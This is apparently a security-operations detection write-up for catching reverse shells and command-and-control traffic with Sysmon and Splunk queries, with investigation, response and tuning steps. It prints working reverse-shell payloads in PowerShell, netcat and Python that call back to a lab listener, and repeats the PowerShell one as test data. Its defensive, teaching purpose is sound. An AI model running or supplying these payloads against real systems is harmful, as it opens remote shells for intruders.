# Reverse Shell Detection

## Overview

Detects reverse shell connections and command-and-control (C2) communication channels by monitoring for suspicious network connections combined with process execution patterns.

## Detection Details

| Property | Value |
|----------|-------|
| **Detection ID** | SOC-DET-005 |
| **Severity** | Critical |
| **Tactics** | Command and Control, Execution |
| **Technique** | [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/) |
| **Data Source** | Sysmon Event Log |
| **Log Source** | `Microsoft-Windows-Sysmon/Operational` |
| **Event Codes** | 1 (Process creation), 3 (Network connection) |

## Description

A reverse shell is a connection initiated from a victim system back to an attacker-controlled server, providing the attacker with interactive command execution. This detection identifies:
- PowerShell reverse shells
- Netcat reverse shells
- Bash reverse shells (via WSL)
- Python reverse shells
- Suspicious outbound connections from scripting interpreters

### Attack Scenarios

**PowerShell Reverse Shell:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.56.10',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
  $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0, $i)
  $sendback = (iex $data 2>&1 | Out-String)
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}
$client.Close()
```

**Netcat Reverse Shell:**
```bash
# From victim
nc.exe 192.168.56.10 4444 -e cmd.exe
```

**Python Reverse Shell:**
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

## Detection Logic

### PowerShell Outbound Connections

```spl
index=sysmon_events EventCode=3 Image="*powershell.exe" Initiated=true
| search NOT (DestinationIp="192.168.*" OR DestinationIp="10.*" OR DestinationIp="172.16.*")
| table _time, SourceIp, DestinationIp, DestinationPort, User
```

### Netcat Detection

```spl
index=sysmon_events EventCode=1
| search (Image="*nc.exe" OR Image="*ncat.exe" OR Image="*netcat*") CommandLine="*-e*"
| table _time, CommandLine, User, ParentImage
```

### Suspicious Scripting Interpreter Connections

```spl
index=sysmon_events EventCode=3 Initiated=true
| search (Image="*powershell.exe" OR Image="*pwsh.exe" OR Image="*python.exe" OR Image="*python3.exe" OR Image="*perl.exe" OR Image="*ruby.exe")
| search NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=53)
| search NOT (DestinationIp="192.168.*" OR DestinationIp="10.*" OR DestinationIp="172.16.*")
| stats count by SourceIp, DestinationIp, DestinationPort, Image
| where count >= 3
```

### Interactive Shell Detection

```spl
index=sysmon_events EventCode=1
| search (ParentImage="*powershell.exe" OR ParentImage="*cmd.exe" OR ParentImage="*bash.exe")
  (Image="*cmd.exe" OR Image="*powershell.exe" OR Image="*bash.exe")
| table _time, ParentImage, Image, CommandLine, User
```

### Combined Reverse Shell Detection

```spl
(index=sysmon_events EventCode=1
  ((Image="*nc.exe" OR Image="*ncat.exe") AND CommandLine="*-e*")
  OR
  (Image="*powershell.exe" AND (CommandLine="*TCPClient*" OR CommandLine="*Socket*"))
  OR
  (Image="*python*.exe" AND CommandLine="*socket*")
)
OR
(index=sysmon_events EventCode=3 Initiated=true
  (Image="*powershell.exe" OR Image="*python.exe" OR Image="*nc.exe")
  | search NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=53)
  | search NOT (DestinationIp="192.168.*" OR DestinationIp="10.*")
)
| eval severity="CRITICAL"
| table _time, severity, Image, CommandLine, DestinationIp, DestinationPort, User
```

## Expected Results

### Normal Activity

| Process | Destination | Result |
|---------|-------------|--------|
| powershell.exe | api.github.com:443 | Legitimate API call |
| python.exe | pypi.org:443 | Package installation |

### Attack Detected

| Process | Destination | Result |
|---------|-------------|--------|
| powershell.exe | 192.168.56.10:4444 | **CRITICAL ALERT** |
| nc.exe | 192.168.56.10:4444 | **CRITICAL ALERT** |
| python.exe | 203.0.113.50:8080 | **CRITICAL ALERT** |

## Alert Configuration

### Critical Alert

```spl
# Search
index=sysmon_events EventCode=3 Initiated=true
| search (Image="*powershell.exe" OR Image="*nc.exe" OR Image="*python.exe")
| search NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=53)
| search NOT (DestinationIp="192.168.*" OR DestinationIp="10.*" OR DestinationIp="172.16.*" OR DestinationIp="127.*")

# Trigger: Number of Results > 0
# Severity: Critical
# Action: Immediate investigation
```

## Investigation Steps

### 1. Identify the Connection

```spl
# Get connection details
index=sysmon_events EventCode=3 DestinationIp="192.168.56.10" DestinationPort=4444
| table _time, SourceIp, DestinationIp, DestinationPort, Image, User
```

### 2. Process Analysis

```spl
# Get process command line
index=sysmon_events EventCode=1 Image="*powershell.exe"
| search User="victim"
| table _time, CommandLine, ParentImage
| head 10
```

### 3. Parent Process Chain

```spl
# Reconstruct process tree
index=sysmon_events EventCode=1
| search User="victim"
| table _time, ProcessId, ParentProcessId, Image, CommandLine
```

### 4. Data Exfiltration Check

```spl
# Check for file transfers
index=sysmon_events EventCode=11 Image="*powershell.exe" OR Image="*nc.exe"
| table _time, TargetFilename, Image
```

### 5. Threat Intelligence Lookup

```spl
# Lookup destination IP
index=sysmon_events EventCode=3 DestinationIp="203.0.113.50"
| table _time, SourceIp, DestinationPort, Image
```

Check IP against threat intelligence feeds:
- VirusTotal
- AbuseIPDB
- AlienVault OTX
- IBM X-Force

## Response Actions

### Immediate (0-5 minutes)

1. **Network isolation** - Disconnect system from network
2. **Process termination** - Kill reverse shell process
3. **Capture volatile data** - Memory dump, network connections
4. **Preserve evidence** - Full packet capture if available

### Short-term (5 min - 2 hours)

1. **Forensic imaging** - Create disk image
2. **Malware analysis** - Identify initial access vector
3. **Scope determination** - Check other systems for similar activity
4. **C2 infrastructure** - Document attacker IP/port for blocking

### Long-term (2+ hours)

1. **Root cause analysis** - How did attacker gain access?
2. **Vulnerability remediation** - Patch exploited vulnerability
3. **Credential reset** - Reset all potentially compromised credentials
4. **Detection enhancement** - Add new detection rules

## False Positives

### Common Scenarios

1. **Legitimate remote administration** (RMM tools, TeamViewer)
2. **Developer tools** connecting to test servers
3. **API calls** from PowerShell scripts
4. **Package managers** (pip, npm) downloading packages

### Tuning

```spl
# Exclude known good destinations
index=sysmon_events EventCode=3
| search NOT DestinationIp IN ("8.8.8.8", "1.1.1.1", "13.107.42.14")
| search Image="*powershell.exe"
```

## Testing

### Setup Listener (Kali)

```bash
# Start netcat listener
nc -lvnp 4444
```

### Generate Test Data (Windows VM)

```powershell
# PowerShell reverse shell (safe, connects to Kali)
$client = New-Object System.Net.Sockets.TCPClient('192.168.56.10',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
  $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0, $i)
  $sendback = (iex $data 2>&1 | Out-String)
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}
$client.Close()
```

### Verify Detection

```spl
# Check alert fired
index=sysmon_events EventCode=3 DestinationIp="192.168.56.10" DestinationPort=4444 earliest=-5m
| stats count
# Should be >= 1
```

## Advanced Variants

### DNS Tunneling Detection

```spl
index=sysmon_events EventCode=22
| stats count by QueryName
| where count >= 100
| table QueryName, count
```

### ICMP Tunneling

```spl
index=sysmon_events EventCode=3
| search DestinationPort=0 Protocol="ICMP"
| stats count by SourceIp, DestinationIp
| where count >= 50
```

## References

- [MITRE ATT&CK T1059](https://attack.mitre.org/techniques/T1059/)
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [High-On.Coffee Reverse Shells](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

## Changelog

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2024-02-10 | 1.0 | SOC Team | Initial detection |
| 2024-03-01 | 1.1 | SOC Team | Added DNS tunneling variant |
| 2024-03-25 | 1.2 | SOC Team | Enhanced false positive tuning |
